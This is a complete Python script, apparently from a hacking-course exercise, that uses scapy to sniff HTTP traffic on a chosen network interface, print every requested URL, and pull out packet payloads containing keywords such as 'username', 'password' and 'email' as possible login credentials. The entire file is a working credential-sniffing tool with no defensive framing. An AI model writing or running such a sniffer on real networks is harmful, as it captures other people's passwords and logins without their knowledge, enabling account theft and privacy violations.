#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest= "interface", help="interface to sniff")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface to sniff, use --help for help for more info")
    return options

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        load = load.decode()
        keywords = ["username", "password", "Username", "Password", "email", "Email", "login", "Login", "pass", "Pass",
                    "User", "user"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode() + "\n")

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible Username/Password >>" + login_info + "\n\n")


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

interface = get_arguments()
sniff(interface.interface)